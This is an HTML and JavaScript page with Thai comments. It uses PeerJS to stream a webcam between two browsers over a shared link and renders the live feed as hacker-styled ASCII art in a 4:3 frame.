<!DOCTYPE html>
<html>
<head>
    <title>Hacker Scan 4:3 - v.02</title>
    <style>
        body { background: black; color: #fff; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        #ascii-display { font-size: 14px; line-height: 11px; white-space: pre; letter-spacing: 1px; color: #fff; font-weight: bold; }
        .ui { position: absolute; bottom: 20px; color: #444; font-size: 12px; letter-spacing: 2px; }
        #status { color: #00ff00; margin-bottom: 10px; font-weight: bold; }
        /* ตกแต่งให้ดูเหมือนจอ 4:3 */
        .monitor-frame { border: 2px solid #222; padding: 10px; background: #050505; box-shadow: 0 0 20px rgba(0,255,0,0.1); }
    </style>
</head>
<body>

    <div id="status">SCANNING FOR SIGNAL...</div>
    <div class="monitor-frame">
        <pre id="ascii-display"></pre>
    </div>
    <div class="ui">RATIO: 4:3 | ENCRYPTED STREAM | 24H MONITOR</div>

    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    
    <script>
        const asciiDisplay = document.getElementById('ascii-display');
        const status = document.getElementById('status');
        const CHAR_SIZE = 16; // ปรับขนาดตัวอักษรให้ใหญ่ตามที่ Achi ชอบ
        const chars = "@#8&WMHB*pxoI;:. ";
        
        const peer = new Peer(); 

        peer.on('open', (id) => {
            const urlParams = new URLSearchParams(window.location.search);
            const targetId = urlParams.get('call');
            if (targetId) {
                startCam(targetId);
            } else {
                status.innerText = "YOUR ID: " + id;
                console.log("Send this link: " + window.location.href + "?call=" + id);
            }
        });

        async function startCam(targetId) {
            try {
                // ล็อกสัดส่วนกล้องเป็น 4:3 (640x480)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: { exact: 640 }, height: { exact: 480 }, aspectRatio: 1.333 } 
                });
                status.innerText = "TARGET IDENTIFIED - 4:3 STREAM";
                peer.call(targetId, stream);
                renderAscii(stream);
            } catch (err) {
                status.innerText = "ERROR: CAM BUSY OR NOT FOUND";
            }
        }

        peer.on('call', (call) => {
            call.answer();
            call.on('stream', (remoteStream) => {
                renderAscii(remoteStream);
                status.innerText = "RECEIVING LIVE FEED [4:3]";
            });
        });

        function renderAscii(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');

            video.onloadedmetadata = () => {
                // บังคับสัดส่วนการคำนวณ ASCII ให้เป็น 4:3
                const w = 60; // จำนวนตัวอักษรแนวนอน
                const h = 45; // จำนวนตัวอักษรแนวตั้ง (60 / 1.333)
                canvas.width = w; canvas.height = h;

                function draw() {
                    ctx.save();
                    ctx.translate(w, 0);
                    ctx.scale(-1, 1);
                    ctx.drawImage(video, 0, 0, w, h);
                    ctx.restore();

                    const pixels = ctx.getImageData(0, 0, w, h).data;
                    let frame = "";
                    for (let y = 0; y < h; y++) {
                        for (let x = 0; x < w; x++) {
                            const i = (y * w + x) * 4;
                            const brightness = (0.299*pixels[i] + 0.587*pixels[i+1] + 0.114*pixels[i+2]);
                            
                            // ระบบเงา: มืดเกินไปไม่ต้องโชว์ตัวอักษร (ตามที่ Achi สั่ง)
                            if (brightness < 70) {
                                frame += " ";
                            } else {
                                const charIdx = Math.floor((brightness / 256) * chars.length);
                                frame += chars[chars.length - 1 - charIdx];
                            }
                        }
                        frame += "\n";
                    }
                    asciiDisplay.innerText = frame;
                    requestAnimationFrame(draw);
                }
                draw();
            };
        }
    </script>
</body>
</html>
